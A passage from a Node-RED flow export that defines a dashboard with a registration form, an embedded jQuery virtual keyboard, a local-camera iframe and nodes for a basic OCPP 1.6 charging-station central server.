                "ed62249715dda406"
            ]
        ]
    },
    {
        "id": "1b41aee955cb5e96",
        "type": "ui_button",
        "z": "7e9ca27958ea1d57",
        "name": "",
        "group": "6a4d510d.5de65",
        "order": 6,
        "width": 0,
        "height": 0,
        "passthru": false,
        "label": "Register",
        "tooltip": "",
        "color": "",
        "bgcolor": "",
        "className": "",
        "icon": "",
        "payload": "Fatal Error! Unable to register! Installing viruses and formatting hard drive in 3, 2, 1, Boom!",
        "payloadType": "str",
        "topic": "",
        "topicType": "str",
        "x": 240,
        "y": 720,
        "wires": [
            [
                "65d5136f4627e81c"
            ]
        ]
    },
    {
        "id": "e26fbcc4.5a681",
        "type": "ui_text_input",
        "z": "7e9ca27958ea1d57",
        "name": "",
        "label": "Username",
        "tooltip": "",
        "group": "6a4d510d.5de65",
        "order": 2,
        "width": 0,
        "height": 0,
        "passthru": true,
        "mode": "text",
        "delay": 300,
        "topic": "",
        "sendOnBlur": true,
        "className": "",
        "topicType": "str",
        "x": 250,
        "y": 600,
        "wires": [
            [
                "b973810a.e5c0f"
            ]
        ]
    },
    {
        "id": "3951049.3fad1fc",
        "type": "ui_text_input",
        "z": "7e9ca27958ea1d57",
        "name": "",
        "label": "Password",
        "tooltip": "",
        "group": "6a4d510d.5de65",
        "order": 3,
        "width": 0,
        "height": 0,
        "passthru": true,
        "mode": "password",
        "delay": 300,
        "topic": "",
        "sendOnBlur": true,
        "className": "",
        "topicType": "str",
        "x": 240,
        "y": 640,
        "wires": [
            [
                "b973810a.e5c0f"
            ]
        ]
    },
    {
        "id": "32f1ea4.2330616",
        "type": "ui_text_input",
        "z": "7e9ca27958ea1d57",
        "name": "",
        "label": "Email",
        "tooltip": "",
        "group": "6a4d510d.5de65",
        "order": 4,
        "width": 0,
        "height": 0,
        "passthru": true,
        "mode": "email",
        "delay": 300,
        "topic": "",
        "sendOnBlur": true,
        "className": "",
        "topicType": "str",
        "x": 230,
        "y": 560,
        "wires": [
            [
                "b973810a.e5c0f"
            ]
        ]
    },
    {
        "id": "d1b0fa5f.bfb838",
        "type": "ui_text_input",
        "z": "7e9ca27958ea1d57",
        "name": "",
        "label": "Number",
        "tooltip": "",
        "group": "6a4d510d.5de65",
        "order": 5,
        "width": 0,
        "height": 0,
        "passthru": true,
        "mode": "number",
        "delay": 300,
        "topic": "",
        "sendOnBlur": true,
        "className": "",
        "topicType": "str",
        "x": 240,
        "y": 520,
        "wires": [
            [
                "b973810a.e5c0f"
            ]
        ]
    },
    {
        "id": "cbb5a5fc40273167",
        "type": "ui_text",
        "z": "7e9ca27958ea1d57",
        "group": "570b4e81eff61e5c",
        "order": 3,
        "width": "6",
        "height": "1",
        "name": "",
        "label": "",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 290,
        "y": 160,
        "wires": []
    },
    {
        "id": "cadf7614afd47366",
        "type": "ui_text",
        "z": "7e9ca27958ea1d57",
        "group": "570b4e81eff61e5c",
        "order": 2,
        "width": "6",
        "height": "1",
        "name": "",
        "label": "State:",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 290,
        "y": 120,
        "wires": []
    },
    {
        "id": "d85975f4b1dbc080",
        "type": "ui_text",
        "z": "7e9ca27958ea1d57",
        "group": "570b4e81eff61e5c",
        "order": 5,
        "width": "6",
        "height": "1",
        "name": "",
        "label": "",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 290,
        "y": 240,
        "wires": []
    },
    {
        "id": "5a25995aa810d1bd",
        "type": "ui_text",
        "z": "7e9ca27958ea1d57",
        "group": "570b4e81eff61e5c",
        "order": 4,
        "width": "6",
        "height": "1",
        "name": "",
        "label": "Command:",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 310,
        "y": 200,
        "wires": []
    },
    {
        "id": "7bde0ecf5b18c5ef",
        "type": "ui_text",
        "z": "7e9ca27958ea1d57",
        "group": "570b4e81eff61e5c",
        "order": 7,
        "width": "6",
        "height": "1",
        "name": "",
        "label": "",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 290,
        "y": 320,
        "wires": []
    },
    {
        "id": "0304ffc17bbc1c82",
        "type": "ui_text",
        "z": "7e9ca27958ea1d57",
        "group": "570b4e81eff61e5c",
        "order": 6,
        "width": "6",
        "height": "1",
        "name": "",
        "label": "Response:",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 310,
        "y": 280,
        "wires": []
    },
    {
        "id": "4912e11d56cf297b",
        "type": "ui_gauge",
        "z": "7e9ca27958ea1d57",
        "name": "",
        "group": "570b4e81eff61e5c",
        "order": 8,
        "width": 0,
        "height": 0,
        "gtype": "gage",
        "title": "State",
        "label": "",
        "format": "{{value}}",
        "min": 0,
        "max": "7",
        "colors": [
            "#e6e600",
            "#e6e600",
            "#00b500"
        ],
        "seg1": "0",
        "seg2": "",
        "diff": false,
        "className": "",
        "x": 410,
        "y": 400,
        "wires": []
    },
    {
        "id": "65d5136f4627e81c",
        "type": "ui_audio",
        "z": "7e9ca27958ea1d57",
        "name": "",
        "group": "6a4d510d.5de65",
        "voice": "Google US English",
        "always": "",
        "x": 420,
        "y": 720,
        "wires": []
    },
    {
        "id": "c5db1e72.3ef58",
        "type": "ui_template",
        "z": "7e9ca27958ea1d57",
        "group": "6a4d510d.5de65",
        "name": "Virtual Keyboard",
        "order": 1,
        "width": "0",
        "height": "0",
        "format": "<script> \n    \n// the semi-colon before function invocation is a safety net against concatenated\n// scripts and/or other plugins which may not be closed properly.\n; (function ($, window, document, undefined) {\n\n    // undefined is used here as the undefined global variable in ECMAScript 3 is\n    // mutable (ie. it can be changed by someone else). undefined isn't really being\n    // passed in so we can ensure the value of it is truly undefined. In ES5, undefined\n    // can no longer be modified.\n\n    // window and document are passed through as local variable rather than global\n    // as this (slightly) quickens the resolution process and can be more efficiently\n    // minified (especially when both are regularly referenced in your plugin).\n\n    // Create the defaults once\n    var pluginName = \"jkeyboard\",\n        defaults = {\n            layout: \"english\",\n            input: $('#input'),\n            customLayouts: {\n                selectable: []\n            },\n        };\n\n\n    var function_keys = {\n        backspace: {\n            text: 'DEL',\n        },\n        return: {\n            text: 'Enter'\n        },\n        shift: {\n            text: 'Shift'\n        },\n        space: {\n            text: 'Space'\n        },\n        numeric_switch: {\n            text: '123',\n            command: function () {\n                this.createKeyboard('numeric');\n                this.events();\n            }\n        },\n        layout_switch: {\n            text: '<i class=\"fa fa-keyboard-o\" aria-hidden=\"true\"></i>',\n            command: function () {\n                var l = this.toggleLayout();\n                this.createKeyboard(l);\n                this.events();\n            }\n        },\n        character_switch: {\n            text: 'ABC',\n            command: function () {\n                this.createKeyboard(layout);\n                this.events();\n            }\n        },\n        symbol_switch: {\n            text: '#+=',\n            command: function () {\n                this.createKeyboard('symbolic');\n                this.events();\n            }\n        }\n    };\n\n\n    var layouts = {\n        selectable: ['azeri', 'english', 'russian','french', 'emoji'],\n        azeri: [\n            ['q', 'ü', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', 'ö', 'ğ'],\n            ['a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'ı', 'ə'],\n            ['shift', 'z', 'x', 'c', 'v', 'b', 'n', 'm', 'ç', 'ş', 'backspace'],\n            ['numeric_switch', 'layout_switch', 'space', 'return']\n        ],\n        english: [\n            ['q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p',],\n            ['a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l',],\n            ['shift', 'z', 'x', 'c', 'v', 'b', 'n', 'm', 'backspace'],\n            ['numeric_switch', 'layout_switch', 'space', 'return']\n        ],\n        russian: [\n            ['й', 'ц', 'у', 'к', 'е', 'н', 'г', 'ш', 'щ', 'з', 'х'],\n            ['ф', 'ы', 'в', 'а', 'п', 'р', 'о', 'л', 'д', 'ж', 'э'],\n            ['shift', 'я', 'ч', 'с', 'м', 'и', 'т', 'ь', 'б', 'ю', 'backspace'],\n            ['numeric_switch', 'layout_switch', 'space', 'return']\n        ],\n        french: [\n            ['q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p',],\n            ['a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l','à','ç'],\n            ['shift', 'z', 'x', 'c', 'v', 'b', 'n', 'm','é','è', 'backspace'],\n            ['numeric_switch', 'layout_switch', 'space', 'return']\n        ],\n        emoji: [\n            ['😀', '😁', '😂', '🤣', '😃', '😄', '😅', '😆', '😉', '😊',],\n            ['😋', '😎', '😍', '😘', 'g', 'h', 'j', 'k', 'l','à','ç'],\n            ['shift', 'z', 'x', 'c', 'v', 'b', 'n', 'm','é','è', 'backspace'],\n            ['numeric_switch', 'layout_switch', 'space', 'return']\n        ],            \n        numeric: [\n            ['1', '2', '3', '4', '5', '6', '7', '8', '9', '0'],\n            ['-', '/', ':', ';', '(', ')', '$', '&', '@', '\"'],\n            ['symbol_switch', '.', ',', '?', '!', \"'\", 'backspace'],\n            ['character_switch', 'layout_switch', 'space', 'return'],\n        ],\n        numbers_only: [\n            ['1', '2', '3',],\n            ['4', '5', '6',],\n            ['7', '8', '9',],\n            ['0', 'backspace'],\n        ],\n        symbolic: [\n            ['[', ']', '{', '}', '#', '%', '^', '*', '+', '='],\n            ['_', '\\\\', '|', '~', '<', '>'],\n            ['numeric_switch', '.', ',', '?', '!', \"'\", 'backspace'],\n            ['character_switch', 'layout_switch', 'space', 'return'],\n\n        ]\n    }\n\n    var shift = false, capslock = false, layout = 'english', layout_id = 0;\n\n    // The actual plugin constructor\n    function Plugin(element, options) {\n        this.element = element;\n        // jQuery has an extend method which merges the contents of two or\n        // more objects, storing the result in the first object. The first object\n        // is generally empty as we don't want to alter the default options for\n        // future instances of the plugin\n        this.settings = $.extend({}, defaults, options);\n        // Extend & Merge the cusom layouts\n        layouts = $.extend(true, {}, this.settings.customLayouts, layouts);\n        if (Array.isArray(this.settings.customLayouts.selectable)) {\n            $.merge(layouts.selectable, this.settings.customLayouts.selectable);\n        }\n        this._defaults = defaults;\n        this._name = pluginName;\n        this.init();\n    }\n\n    Plugin.prototype = {\n        init: function () {\n            layout = this.settings.layout;\n            this.createKeyboard(layout);\n            this.events();\n        },\n\n        setInput: function (newInputField) {\n            this.settings.input = newInputField;\n        },\n\n        createKeyboard: function (layout) {\n            shift = false;\n            capslock = false;\n\n            var keyboard_container = $('<ul/>').addClass('jkeyboard'),\n                me = this;\n\n            layouts[layout].forEach(function (line, index) {\n                var line_container = $('<li/>').addClass('jline');\n                line_container.append(me.createLine(line));\n                keyboard_container.append(line_container);\n            });\n\n            $(this.element).html('').append(keyboard_container);\n        },\n\n        createLine: function (line) {\n            var line_container = $('<ul/>');\n\n            line.forEach(function (key, index) {\n                var key_container = $('<li/>').addClass('jkey').data('command', key);\n\n                if (function_keys[key]) {\n                    key_container.addClass(key).html(function_keys[key].text);\n                }\n                else {\n                    key_container.addClass('letter').html(key);\n                }\n\n                line_container.append(key_container);\n            })\n\n            return line_container;\n        },\n\n        events: function () {\n            var letters = $(this.element).find('.letter'),\n                shift_key = $(this.element).find('.shift'),\n                space_key = $(this.element).find('.space'),\n                backspace_key = $(this.element).find('.backspace'),\n                return_key = $(this.element).find('.return'),\n\n                me = this,\n                fkeys = Object.keys(function_keys).map(function (k) {\n                    return '.' + k;\n                }).join(',');\n\n            letters.on('click', function () {\n                me.type((shift || capslock) ? $(this).text().toUpperCase() : $(this).text());\n            });\n\n            space_key.on('click', function () {\n                me.type(' ');\n            });\n\n            return_key.on('click', function () {\n                me.type(\"\\n\");\n                me.settings.input.parents('form').submit();\n            });\n\n            backspace_key.on('click', function () {\n                me.backspace();\n            });\n\n            shift_key.on('click', function () {\n                if (capslock) {\n                    me.toggleShiftOff();\n                    capslock = false;\n                } else {\n                    me.toggleShiftOn();\n                }\n            }).on('dblclick', function () {\n                capslock = true;\n            });\n\n\n            $(fkeys).on('click', function () {\n                var command = function_keys[$(this).data('command')].command;\n                if (!command) return;\n\n                command.call(me);\n            });\n        },\n\n        type: function (key) {\n            var input = this.settings.input,\n                val = input.val(),\n                input_node = input.get(0),\n                start = input_node.selectionStart,\n                end = input_node.selectionEnd;\n\n            var max_length = $(input).attr(\"maxlength\");\n            if (start == end && end == val.length) {\n                if (!max_length || val.length < max_length) {\n                    input.val(val + key);\n                    input.change()\n                    $('#vkeyname').text(val + key)\n                }\n            } else {\n                if (input_node.type == \"text\"){\n                    var new_string = this.insertToString(start, end, val, key);\n                    input.val(new_string);\n                    start++;\n                    end = start;\n                    input_node.setSelectionRange(start, end);\n                }else{\n                    input.val(val + key);\n                }\n                input.change()\n                $('#vkeyname').text(val + key)\n                \n            }\n            input.trigger('focus');\n\n            if (shift && !capslock) {\n                this.toggleShiftOff();\n            }\n        },\n\n        backspace: function () {\n            var input = this.settings.input,\n                val = input.val();\n                input_node = input.get(0),\n                start = input_node.selectionStart,\n                end = input_node.selectionEnd;\n            if (input.type == \"text\"){\n                input.val(val.slice(0, start-1) + val.slice(start))\n                input_node.setSelectionRange(start-1, start-1);\n                console.log(val)\n                $('#vkeyname').text(val)\n            }else{\n                input.val(val.slice(0,-1))\n                $('#vkeyname').text(val.slice(0,-1))\n            }\n            input.change()\n            input.focus()\n        },\n\n        toggleShiftOn: function () {\n            var letters = $(this.element).find('.letter'),\n                shift_key = $(this.element).find('.shift');\n\n            letters.addClass('uppercase');\n            shift_key.addClass('active')\n            shift = true;\n        },\n\n        toggleShiftOff: function () {\n            var letters = $(this.element).find('.letter'),\n                shift_key = $(this.element).find('.shift');\n\n            letters.removeClass('uppercase');\n            shift_key.removeClass('active');\n            shift = false;\n        },\n\n        toggleLayout: function () {\n            layout_id = layout_id || 0;\n            var plain_layouts = layouts.selectable;\n            layout_id++;\n\n            var current_id = layout_id % plain_layouts.length;\n            var SelectedLayoutName = plain_layouts[current_id];\n            $('#vkeyname').text('V-Keyboard ' + SelectedLayoutName )\n            return plain_layouts[current_id];\n        },\n\n        insertToString: function (start, end, string, insert_string) {\n            return string.substring(0, start) + insert_string + string.substring(end, string.length);\n        }\n    };\n\n        /*\n\t\t// A really lightweight plugin wrapper around the constructor,\n\t\t// preventing against multiple instantiations\n\t\t$.fn[ pluginName ] = function ( options ) {\n\t\t\t\treturn this.each(function() {\n\t\t\t\t\t\tif ( !$.data( this, \"plugin_\" + pluginName ) ) {\n\t\t\t\t\t\t\t\t$.data( this, \"plugin_\" + pluginName, new Plugin( this, options ) );\n\t\t\t\t\t\t}\n\t\t\t\t});\n\t\t};\n        */\n        var methods = {\n            init: function(options) {\n                if (!this.data(\"plugin_\" + pluginName)) {\n                    this.data(\"plugin_\" + pluginName, new Plugin(this, options));\n                }\n            },\n\t\t\tsetInput: function(content) {\n\t\t\t\tthis.data(\"plugin_\" + pluginName).setInput($(content));\n            },\n            setLayout: function(layoutname) {\n                // change layout if it is not match current\n                object = this.data(\"plugin_\" + pluginName);\n                if (typeof(layouts[layoutname]) !== 'undefined' && object.settings.layout != layoutname) {\n                    object.settings.layout = layoutname;\n                    object.createKeyboard(layoutname);\n                    object.events();\n                };\n            },\n        };\n\n\t\t$.fn[pluginName] = function (methodOrOptions) {\n            if (methods[methodOrOptions]) {\n                return methods[methodOrOptions].apply(this.first(), Array.prototype.slice.call( arguments, 1));\n            } else if (typeof methodOrOptions === 'object' || ! methodOrOptions) {\n                // Default to \"init\"\n                return methods.init.apply(this.first(), arguments);\n            } else {\n                $.error('Method ' +  methodOrOptions + ' does not exist on jQuery.tooltip');\n            }\n        };\n\n})(jQuery, window, document);\n</script>\n<style>\n    .jkeyboard {\n  display: inline-block;\n}\n.jkeyboard, .jkeyboard .jline, .jkeyboard .jline ul {\n  display: block;\n  margin: 0;\n  padding: 0;\n}\n.jkeyboard .jline {\n  text-align: center;\n  margin-left: -14px;\n}\n.jkeyboard .jline ul li {\n  font-family: arial, sans-serif;\n  font-size: 20px;\n  display: inline-block;\n  border: 1px solid #468db3;\n  -webkit-box-shadow: 0 0 3px #468db3;\n  -webkit-box-shadow: inset 0 0 3px #468db3;\n  margin: 5px 0 1px 6px;\n  color: #000000;\n  border-radius: 5px;\n  width: 52px;\n  height: 52px;\n  box-sizing: border-box;\n  text-align: center;\n  line-height: 52px;\n  overflow: hidden;\n  cursor: pointer;\n  -webkit-touch-callout: none;\n  -webkit-user-select: none;\n  -khtml-user-select: none;\n  -moz-user-select: -moz-none;\n  -ms-user-select: none;\n  user-select: none;\n}\n.jkeyboard .jline ul li.uppercase {\n  text-transform: uppercase;\n}\n.jkeyboard .jline ul li:hover, .jkeyboard .jline ul li:active {\n  background-color: #185a82;\n}\n.jkeyboard .jline .return {\n  width: 80px;\n}\n.jkeyboard .jline .space {\n  width: 366px;\n}\n.jkeyboard .jline .numeric_switch {\n  width: 65px;\n}\n.jkeyboard .jline .layout_switch {\n}\n.jkeyboard .jline .shift {\n  width: 60px;\n}\n.jkeyboard .jline .backspace {\n  width: 69px;\n}\n</style>\n\n\n\n\n<style>\nbody {font-family: Arial, Helvetica, sans-serif;}\n\n.nr-dashboard-theme .nr-dashboard-template .md-button:not(:first-of-type) {\n    margin-top: 0px;\n}\n\n/* The Modal (background) */\n.modal {\n    display: none; /* Hidden by default */\n    position: fixed; /* Stay in place */\n    opacity:0.99;\n    z-index: 100; /* Sit on top */\n    left: 0;\n    top: 0;\n    width: 100%; /* Full width */\n    height: 100%; /* Full height */\n    overflow: auto; /* Enable scroll if needed */\n    background-color: rgb(0,0,0); /* Fallback color */\n    background-color: rgba(0,0,0,0.4); /* Black w/ opacity */\n}\n\n/* Modal Content */\n.modal-content {\n    position: fixed;\n    background-color: #fefefe;\n    margin: auto;\n    padding: 0;\n    bottom: 0%;\n    left: 50%;\n    transform: translate(-50%, 0%);\n    border: 1px solid #888;\n    width: fit-content;\n    max-width: 100%;\n    max-height: 100%;\n    box-shadow: 0 4px 8px 0 rgba(0,0,0,0.2),0 6px 20px 0 rgba(0,0,0,0.19);\n    -webkit-animation-name: animate;\n    -webkit-animation-duration: 0.4s;\n    animation-name: animate;\n    animation-duration: 0.4s\n}\n\n/* Add Animation */\n@-webkit-keyframes animate {\n    from {bottom:100%; opacity:0} \n    to {bottom:0%; opacity:1}\n}\n\n@keyframes animate {\n    from {bottom:100%; opacity:0}\n    to {bottom:0%; opacity:1}\n}\n\n/* The Close Button */\n.close {\n    color: black;\n    float: right;\n    font-size: 28px;\n    font-weight: bold;\n}\n\n.close:hover,\n.close:focus {\n    color: #000;\n    text-decoration: none;\n    cursor: pointer;\n}\n\n.modal-header {\n    padding: 2px 16px;\n    background-color: aliceblue;\n    color: white;\n}\n\n.modal-body {padding: 2px 16px;}\n\n.modal-footer {\n    padding: 2px 16px;\n    background-color: #5cb85c;\n    color: white;\n}\n</style>\n\n<!-- The Modal -->\n<div id=\"myModal\" class=\"modal\">\n\n  <!-- Modal content -->\n  <div class=\"modal-content\">\n      <div class=\"modal-header\">\n      <span class=\"close\" onclick=\"closeModal()\">&times;</span>\n      <h2 id=\"vkeyname\" style=\"background-color: aliceblue !important; color: black !important; text-align: center; min-height: 30px;\">V-Keyboard</h2>\n    </div>\n    <div class=\"modal-body\">\n        <div id=\"keyboard\"></div>\n        <div>\n        </div>\n    </div>\n  </div>\n</div>\n\n\n<script>\n    // Get the modal\nvar modal = document.getElementById('myModal');\n\n/*\n$('input[type=text]').click(function () {\n    $('#keyboard').unbind().removeData();\n        $('#keyboard').jkeyboard({\n            layout: \"english\",\n            input: $('#'+$(this).attr('id'))\n    });\n});\n\n$('input[type=number]').click(function () {\n    $('#keyboard').unbind().removeData();\n        $('#keyboard').jkeyboard({\n            layout: \"numbers_only\",\n            input: $('#'+$(this).attr('id'))\n    });\n});\n*/\n\nvar inputTags;\nvar inputType;\n\nvar getinputs = function() {\n    inputTags = document.getElementsByTagName(\"input\");\n    console.log(inputTags)\n    for (var i = 0; i < inputTags.length; i++) {\n        inputTags[i].addEventListener('click', openModal, false)\n    }\n}\n\nsetTimeout(function(){ getinputs(); }, 1000);\n\nvar inputTarget;\n\nvar openModal = function() {\n    inputType = event.target.type\n    inputTarget = event.target\n    var layoutName;\n    if (inputType == \"number\"){\n        //inputTarget.type = \"number\" //hack because chrome doesn't allow setselection in number inputs\n        //inputTarget.value = \"\"\n        layoutName = \"numbers_only\"\n    }else{\n        layoutName = \"english\"\n    }\n    $('#vkeyname').text(event.target.value)\n    $('#keyboard').unbind().removeData();\n    modal.style.display = \"block\";\n    $('#keyboard').jkeyboard({\n        layout: layoutName,\n        input: $('#'+$(this).attr('id'))\n    });\n}\n\n\n// Get the <span> element that closes the modal\nvar span = document.getElementsByClassName(\"close\")[0];\n\n// When the user clicks on <span> (x), close the modal\n//span.onclick = function(event) {\n  //closeModal()\n//}\n\n// When the user clicks anywhere outside of the modal, close it\nwindow.onclick = function(event) {\n    var source = event.target;\n    if (source == modal || source == span) {\n        closeModal(source)\n    }\n};\n\nvar closeModal = function(source){\n    //console.log(\"closing\")\n    modal.style.display = \"none\";\n   \n    if (inputType == \"number\"){\n        inputTarget.type = \"number\" //hack because chrome doesn't allow selectionstart on number inputs\n    }\n}\n\n</script>\n<script>\n\nvar clickState = 1;\nvar btn = document.querySelector('.VK');\n\nbtn.addEventListener('click', function(){\n\n  if (clickState == 0) {\n    this.textContent = 'V-KeyBoard On';\n    modal = document.getElementById('myModal');\n    clickState = 1;\n  } else {\n    this.textContent = 'V-KeyBoard Off';\n    modal = document.getElementById('empty');\n    clickState = 0;\n  }\n\n});\n</script>\n\n<style>\n.VK{\n    position: fixed;\n    top: 60px;\n    right: 20px;\n    height: 30px;\n}\n</style>\n\n<div id=\"empty\"></div>\n<button class=\"VK\">V-KeyBoard On</button> ",
        "storeOutMessages": false,
        "fwdInMessages": false,
        "resendOnRefresh": false,
        "templateScope": "local",
        "className": "",
        "x": 260,
        "y": 480,
        "wires": [
            []
        ]
    },
    {
        "id": "f961cef1536c92e6",
        "type": "ui_template",
        "z": "7e9ca27958ea1d57",
        "group": "5c044aeab0668850",
        "name": "",
        "order": 1,
        "width": "0",
        "height": "0",
        "format": "<div ng-bind-html=\"msg.payload\"></div>\n<iframe scrolling=no marginwidth=0 marginheight=0 frameborder=0 height=420 width=520 src=\"http://192.168.1.4:81/html/min.php\"></iframe>\n<!--\n<iframe scrolling=no marginwidth=0 marginheight=0 frameborder=0 height=439 width=553 src=\"http://192.168.1.4:81/html/min.php\"></iframe>\n-->",
        "storeOutMessages": true,
        "fwdInMessages": true,
        "resendOnRefresh": true,
        "templateScope": "local",
        "className": "",
        "x": 560,
        "y": 60,
        "wires": [
            []
        ]
    },
    {
        "id": "e09ee41cd3259748",
        "type": "counter",
        "z": "7e9ca27958ea1d57",
        "name": "",
        "init": "0",
        "step": "1",
        "lower": "",
        "upper": "",
        "mode": "increment",
        "outputs": "1",
        "x": 255,
        "y": 400,
        "wires": [
            [
                "27402358bec486a3"
            ]
        ],
        "l": false
    },
    {
        "id": "7dcf2c29.43a464",
        "type": "debug",
        "z": "acc9f35a.ec54d8",
        "name": "Received msg",
        "active": false,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "true",
        "targetType": "full",
        "statusVal": "",
        "statusType": "auto",
        "x": 400,
        "y": 320,
        "wires": []
    },
    {
        "id": "68a8235f.451e04",
        "type": "switch",
        "z": "acc9f35a.ec54d8",
        "name": "OCPP CS Command Switch",
        "property": "payload.command",
        "propertyType": "msg",
        "rules": [
            {
                "t": "eq",
                "v": "BootNotification",
                "vt": "str"
            },
            {
                "t": "eq",
                "v": "Authorize",
                "vt": "str"
            },
            {
                "t": "eq",
                "v": "Heartbeat",
                "vt": "str"
            },
            {
                "t": "eq",
                "v": "StatusNotification",
                "vt": "str"
            },
            {
                "t": "eq",
                "v": "MeterValues",
                "vt": "str"
            },
            {
                "t": "eq",
                "v": "StartTransaction",
                "vt": "str"
            },
            {
                "t": "eq",
                "v": "StopTransaction",
                "vt": "str"
            },
            {
                "t": "else"
            }
        ],
        "checkall": "true",
        "repair": false,
        "outputs": 8,
        "x": 440,
        "y": 220,
        "wires": [
            [
                "7194ed20.873d8c"
            ],
            [
                "e936416b.681468"
            ],
            [
                "6c952053.e7be8",
                "5419cc087ae01cfe",
                "b1f1cafd2aaecd67"
            ],
            [
                "243ae570.3009e2"
            ],
            [
                "243ae570.3009e2",
                "b9839e55.58e7c8"
            ],
            [
                "af7e1d23.d8562"
            ],
            [
                "8e8b7998.b5fea8"
            ],
            [
                "23cbe1e51e37907a"
            ]
        ]
    },
    {
        "id": "7194ed20.873d8c",
        "type": "function",
        "z": "acc9f35a.ec54d8",
        "name": "BootNotification",
        "func": "msg.payload = {\n    interval: 60,\n    currentTime: new Date().toISOString(),\n    status: \"Accepted\"\n}\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 800,
        "y": 60,
        "wires": [
            [
                "87468474.e9785",
                "d05f0bc4a54585d6"
            ]
        ]
    },
    {
        "id": "af7e1d23.d8562",
        "type": "function",
        "z": "acc9f35a.ec54d8",
        "name": "Start Transaction",
        "func": "msg.payload = {\n    idTagInfo: {\n        status: \"Accepted\",\n    },\n    transactionId: getRndInteger(0,100000)\n}\nreturn msg;\n\nfunction getRndInteger(min, max) {\n    return Math.floor(Math.random() * (max - min + 1) ) + min;\n}\n",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 810,
        "y": 220,
        "wires": [
            [
                "87468474.e9785",
                "d05f0bc4a54585d6"
            ]
        ]
    },
    {
        "id": "8e8b7998.b5fea8",
        "type": "function",
        "z": "acc9f35a.ec54d8",
        "name": "Stop Transaction",
        "func": "msg.payload = { idTagInfo: { status: \"Accepted\"} };\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 810,
        "y": 260,
        "wires": [
            [
                "87468474.e9785",
                "d05f0bc4a54585d6"
            ]
        ]
    },
    {
        "id": "6c952053.e7be8",
        "type": "change",
        "z": "acc9f35a.ec54d8",
        "name": "Heartbeat",
        "rules": [
            {
                "t": "set",
                "p": "payload",
                "pt": "msg",
                "to": "{}",
                "tot": "json"
            },
            {
                "t": "set",
                "p": "payload.currentTime",
                "pt": "msg",
                "to": "$now()",
                "tot": "jsonata"
            }
        ],
        "action": "",
        "property": "",
        "from": "",
        "to": "",
        "reg": false,
        "x": 780,
        "y": 140,
        "wires": [
            [
                "87468474.e9785",
                "d05f0bc4a54585d6"
            ]
        ]
    },
    {
        "id": "e936416b.681468",
        "type": "change",
        "z": "acc9f35a.ec54d8",
        "name": "Generic Status=Accepted",
        "rules": [
            {
                "t": "set",
                "p": "payload",
                "pt": "msg",
                "to": "{\"idTagInfo\":{\"status\":\"Accepted\"}}",
                "tot": "json"
            }
        ],
        "action": "",
        "property": "",
        "from": "",
        "to": "",
        "reg": false,
        "x": 830,
        "y": 100,
        "wires": [
            [
                "87468474.e9785",
                "d05f0bc4a54585d6"
            ]
        ]
    },
    {
        "id": "243ae570.3009e2",
        "type": "change",
        "z": "acc9f35a.ec54d8",
        "name": "Generic Return",
        "rules": [
            {
                "t": "set",
                "p": "ocpp.data",
                "pt": "msg",
                "to": "payload.data",
                "tot": "msg"
            },
            {
                "t": "set",
                "p": "payload",
                "pt": "msg",
                "to": "{}",
                "tot": "json"
            }
        ],
        "action": "",
        "property": "",
        "from": "",
        "to": "",
        "reg": false,
        "x": 800,
        "y": 180,
        "wires": [
            [
                "87468474.e9785",
                "d05f0bc4a54585d6"
            ]
        ]
    },
    {
        "id": "b9839e55.58e7c8",
        "type": "debug",
        "z": "acc9f35a.ec54d8",
        "name": "Meter values",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "payload.data.meterValue[0].sampledValue[0]",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 790,
        "y": 340,
        "wires": []
    },
    {
        "id": "dc104c1f.79ca1",
        "type": "comment",
        "z": "acc9f35a.ec54d8",
        "name": "Basic OCPP Central System Server and supporting nodes - example with JSON 1.6",
        "info": "Change the port address and paths to meet your needs.\nThis is a very basic (does represent a fully functional CS) example",
        "x": 370,
        "y": 60,
        "wires": []
    },
    {
        "id": "18419d3094e0725d",
        "type": "debug",
        "z": "acc9f35a.ec54d8",
        "name": "",
        "active": false,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "true",
        "targetType": "full",
        "statusVal": "",
        "statusType": "auto",
        "x": 430,
        "y": 120,
        "wires": []
    },
    {
        "id": "8fd82da80f3201de",
        "type": "inject",
        "z": "acc9f35a.ec54d8",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "1",
        "payloadType": "num",
        "x": 150,
        "y": 120,
        "wires": [
            [
                "2d778df937587cfe"
            ]
        ]
    },
    {
        "id": "05c96047a271c85d",
        "type": "debug",
        "z": "acc9f35a.ec54d8",
        "name": "Received payload",
        "active": false,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 410,
        "y": 400,
        "wires": []
    },
    {
        "id": "7cb49bdcb9c5a6f1",
        "type": "debug",
        "z": "acc9f35a.ec54d8",
        "name": "Received ocpp",
        "active": false,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "ocpp",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 400,
        "y": 360,
        "wires": []
    },
    {
